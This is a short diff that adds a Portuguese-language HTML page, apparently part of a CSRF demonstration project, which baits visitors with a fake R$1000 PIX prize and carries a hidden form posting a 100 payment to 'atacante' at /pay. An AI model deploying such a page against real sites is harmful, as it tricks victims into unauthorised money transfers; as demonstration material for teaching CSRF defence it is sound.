@@ -1,0 +1,17 @@
+<!-- wwwroot/attacker/index.html -->
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <title>Ataque CSRF</title>
+</head>
+<body>
+  <h1>Ganhe um PIX de R$1000 clicando no botão abaixo!</h1>
+
+  <form action="/pay" method="POST">
+    <input type="hidden" name="to" value="atacante" />
+    <input type="hidden" name="amount" value="100" />
+    <button type="submit">Receber prêmio</button>
+  </form>
+</body>
+</html>
